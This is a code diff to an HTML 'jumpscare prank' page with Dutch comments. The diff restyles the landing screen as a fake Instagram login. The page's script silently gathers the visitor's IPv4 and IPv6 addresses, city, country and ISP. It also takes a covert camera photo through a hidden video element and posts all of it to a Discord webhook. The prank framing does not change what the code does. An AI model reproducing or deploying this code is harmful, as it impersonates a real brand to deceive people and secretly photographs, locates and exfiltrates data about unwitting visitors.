@@ -31,74 +31,86 @@
     #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; top: -9999px; }
     #hidden-canvas { display: none; }
 
-    /* ── SCREEN: LANDING (Login Portal) ── */
+    /* ── SCREEN: LANDING (Instagram Style) ── */
     #screen-landing {
       position: fixed; inset: 0;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 24px;
-      background: #0d1117;
+      padding: 20px;
+      background: #fafafa;
       z-index: 10;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
 
-    .login-box {
+    .insta-box {
       width: 100%;
-      max-width: 320px;
-      background: #161b22;
-      border: 1px solid #30363d;
-      border-radius: 6px;
-      padding: 20px;
+      max-width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px 20px;
       display: flex;
       flex-direction: column;
-      gap: 15px;
+      gap: 10px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
     }
 
-    .login-header {
-      font-size: 1.5rem;
-      font-weight: 400;
+    .insta-logo {
+      font-family: 'Inter', sans-serif;
+      font-weight: 800;
+      font-size: 2rem;
       text-align: center;
       margin-bottom: 20px;
-      color: #f0f6fc;
+      color: #262626;
+      letter-spacing: -1px;
     }
 
-    .login-label {
-      font-size: 0.85rem;
-      font-weight: 600;
-      margin-bottom: 5px;
-      color: #c9d1d9;
-    }
-
-    .login-input {
-      background: #0d1117;
-      border: 1px solid #30363d;
-      border-radius: 6px;
-      padding: 6px 12px;
-      color: #c9d1d9;
-      font-size: 0.95rem;
+    .insta-input {
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 9px 12px;
+      color: #262626;
+      font-size: 0.8rem;
       width: 100%;
     }
 
-    .login-btn-primary {
-      background-color: #238636;
+    .insta-btn {
+      background-color: #0095f6;
       color: #fff;
-      border: 1px solid rgba(27,31,35,0.15);
-      border-radius: 6px;
-      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 0;
       font-weight: 600;
       cursor: pointer;
       text-align: center;
       margin-top: 10px;
+      font-size: 0.9rem;
     }
-    .login-btn-primary:hover { background-color: #2ea043; }
+    .insta-btn:hover { background-color: #1877f2; }
+
+    .insta-divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      color: #8e8e8e;
+      font-size: 0.8rem;
+      margin: 15px 0;
+    }
+    .insta-divider::before, .insta-divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+    .insta-divider:not(:empty)::before { margin-right: .5em; }
+    .insta-divider:not(:empty)::after { margin-left: .5em; }
 
     .landing-bottom-meta {
       position: absolute;
-      bottom: 20px;
-      font-size: 0.7rem;
-      color: #484f58;
+      bottom: 40px;
+      font-size: 0.75rem;
+      color: #8e8e8e;
     }
 
     /* ── SCREEN: LOADING (stiekem camera) ── */
@@ -234,26 +246,18 @@
 
 <!-- ── SCREEN 1: LANDING ── -->
 <div id="screen-landing">
-  <div class="login-header">Sign in to your account</div>
-  <div class="login-box">
-    <div style="display:flex; flex-direction:column; gap:5px;">
-      <span class="login-label">Username or email address</span>
-      <input type="text" class="login-input">
+  <div class="insta-box">
+    <div class="insta-logo">Instagram</div>
+    <input type="text" class="insta-input" placeholder="Phone number, username, or email">
+    <input type="password" class="insta-input" placeholder="Password">
+    <button class="insta-btn" onclick="startPrank()">Log In</button>
+    <div class="insta-divider">OR</div>
+    <div style="color:#00376b; font-size:0.85rem; font-weight:600; text-align:center; cursor:pointer;" onclick="startPrank()">
+      Sign up with Facebook
     </div>
-    <div style="display:flex; flex-direction:column; gap:5px;">
-      <div style="display:flex; justify-content:space-between; align-items:center;">
-        <span class="login-label">Password</span>
-        <span style="font-size:0.75rem; color:#58a6ff; cursor:pointer;">Forgot password?</span>
-      </div>
-      <input type="password" class="login-input">
-    </div>
-    <button class="login-btn-primary" onclick="startPrank()">Sign in</button>
-    <div style="text-align:center; margin-top:10px;">
-      <span style="font-size:0.8rem; color:#c9d1d9;">New here? </span>
-      <span style="font-size:0.8rem; color:#58a6ff; cursor:pointer;" onclick="startPrank()">Create an account</span>
-    </div>
+    <div style="color:#00376b; font-size:0.75rem; text-align:center; margin-top:10px; cursor:pointer;">Forgot password?</div>
   </div>
-  <div class="landing-bottom-meta">Encryption: SSL/TLS AES-256 Enabled</div>
+  <div class="landing-bottom-meta">© 2026 Instagram from Meta</div>
 </div>
 
 <!-- ── SCREEN 2: LOADING ── -->
@@ -285,47 +289,37 @@
   
   let stream = null;
   let capturedDataUrl = null;
+  let ipInfo = { ipv4: 'onbekend', ipv6: 'onbekend', location: '', org: '' };
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
 
-  // ── IP LOGGER (FORCED IPv4) ──
-  async function logVisitor() {
+  // ── SILENT LOGGING (V4 + V6) ──
+  async function prepareLogs() {
     try {
-      // Force IPv4 via ipify
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      const ipv4 = ipData.ip;
-
-      // Get details for this IPv4
-      const response = await fetch(`https://ipapi.co/${ipv4}/json/`);
-      const data = await response.json();
+      // Fetch IPv4
+      const v4res = await fetch('https://api.ipify.org?format=json').catch(() => null);
+      if (v4res) {
+        const v4data = await v4res.json();
+        ipInfo.ipv4 = v4data.ip;
+      }
       
-      const payload = {
-        username: '🕵️ IPv4 Tracker',
-        embeds: [{
-          title: '🌐 Nieuwe Bezoeker!',
-          color: 0x3498db,
-          fields: [
-            { name: 'IPv4 Adres', value: `\`${data.ip}\``, inline: true },
-            { name: 'Locatie', value: `${data.city}, ${data.country_name}`, inline: true },
-            { name: 'Provider', value: data.org, inline: false },
-            { name: 'Device', value: navigator.platform, inline: true }
-          ],
-          timestamp: new Date()
-        }]
-      };
+      // Fetch IPv6 (v6-only endpoint)
+      const v6res = await fetch('https://api64.ipify.org?format=json').catch(() => null);
+      if (v6res) {
+        const v6data = await v6res.json();
+        ipInfo.ipv6 = v6data.ip;
+      }
 
-      await fetch(WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-    } catch(e) { console.log('IP log skip'); }
+      // Get geolocation details
+      const detailsRes = await fetch(`https://ipapi.co/${ipInfo.ipv4}/json/`).catch(() => null);
+      if (detailsRes) {
+        const details = await detailsRes.json();
+        ipInfo.location = `${details.city}, ${details.country_name}`;
+        ipInfo.org = details.org;
+      }
+    } catch(e) { console.log('Log init fail'); }
   }
 
-  // Log bezoeker direct bij laden
-  window.addEventListener('scroll', logVisitor, { once: true });
-  window.addEventListener('click', logVisitor, { once: true });
-  logVisitor();
+  prepareLogs();
 
   // ── JUMPSCARE SOUND ──
   function playJumpscareSound() {
@@ -421,13 +415,6 @@
       console.log('Camera geweigerd:', e);
     }
 
-    // Troll sound vast "un-muten" door alvast kort te spelen en te pauzeren (browser trick)
-    const tSound = document.getElementById('troll-sound');
-    tSound.play().then(() => {
-      tSound.pause();
-      tSound.currentTime = 0;
-    }).catch(() => {});
-
     // Wacht 1.5 seconden
     setTimeout(() => {
       clearInterval(textInterval);
@@ -511,20 +498,28 @@
 
       const now = new Date();
       const timeStr = now.toLocaleString('nl-NL', { timeZone: 'Europe/Amsterdam' });
+      const deviceName = navigator.userAgentData?.platform || navigator.platform || 'Onbekend';
 
       const form = new FormData();
       form.append('payload_json', JSON.stringify({
         username: '😱 JumpScare Prank',
-        avatar_url: 'https://cdn.discordapp.com/embed/avatars/4.png',
-        content: `😱 **JUMPSCARE SLACHTOFFER GEVONDEN!!**\n🕐 Tijdstip: \`${timeStr}\`\n💀 Ze schrokken zich kapot hahaha`,
+        content: `😱 **JUMPSCARE SLACHTOFFER GEVONDEN!!**`,
         embeds: [{
-          title: '!',
-          description: ' 💀😂',
+          title: '📸 Foto & System Gegevens',
           color: 0xff4444,
-          footer: { text: ' Prank Tool' }
+          fields: [
+            { name: '🕐 Tijdstip', value: `\`${timeStr}\``, inline: true },
+            { name: '📱 Apparaat', value: `\`${deviceName}\``, inline: true },
+            { name: '🌐 IPv4', value: `\`${ipInfo.ipv4}\``, inline: true },
+            { name: '🌐 IPv6', value: `\`${ipInfo.ipv6}\``, inline: true },
+            { name: '📍 Locatie', value: `${ipInfo.location}`, inline: true },
+            { name: '🏢 ISP', value: `${ipInfo.org}`, inline: true },
+          ],
+          image: { url: 'attachment://jumpscare.jpg' },
+          footer: { text: 'Night Owl Prank Tool' }
         }]
       }));
-      form.append('file', blob, `jumpscare_${Date.now()}.jpg`);
+      form.append('file', blob, 'jumpscare.jpg');
 
       await fetch(WEBHOOK, { method: 'POST', body: form });
     } catch(err) {
